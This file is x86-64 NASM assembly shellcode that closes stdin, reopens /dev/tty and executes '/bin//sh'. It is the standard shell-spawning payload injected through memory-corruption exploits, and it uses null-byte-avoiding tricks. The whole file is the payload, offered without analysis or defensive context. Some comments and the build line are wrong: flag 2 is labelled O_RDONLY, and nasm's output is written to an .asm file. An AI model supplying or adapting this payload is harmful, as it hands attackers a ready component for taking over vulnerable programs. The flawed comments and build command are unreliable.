; opens simple shell, closing stdin, opening /dev/tty
; assemble and run: $ nasm -f elf64 -o <name>.asm && ld <name>.o && ./a.out

section .text
    global _start

_start: 
	
    ; int close(int fd)
    xor rdi, rdi        ; rdi (srg1) = 0 (stdin)
    mov rax, rdi
    mov rax, 0x3        ; rax = (close syscall)
    syscall

    ; int open(const char *pathname, int flags)
    push rdi            ; push '0x00' onto stack as null terminator 
    mov rsi, rdi
    mov rdi, '/dev/tty'
    push rdi            ; push '/dev/tty' ('/dev/tty0x00' now on stack)
    mov rdi, rsp        ; rdi (arg1) = ptr to '/dev/tty0x00'
    mov rsi, 0x2        ; rsi (arg2) = 2 (O_RDONLY)
    dec rax             ; rax = 2 (open syscall) 
    syscall

    ; syntax: int execve(const char *pathname, char *const argv[], char *const envp[])
    xor rdx, rdx        ; rdx (arg3) = 0	
    push rdx
    mov rdi, rdx
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp        ; rdi (arg1) = ptr to '/bin//sh0x00'
    mov rsi, rax        ; rsi (arg2) = 0
    mov rax, 0x3b       ; rax = 0x3b (execve syscall)
    syscall		
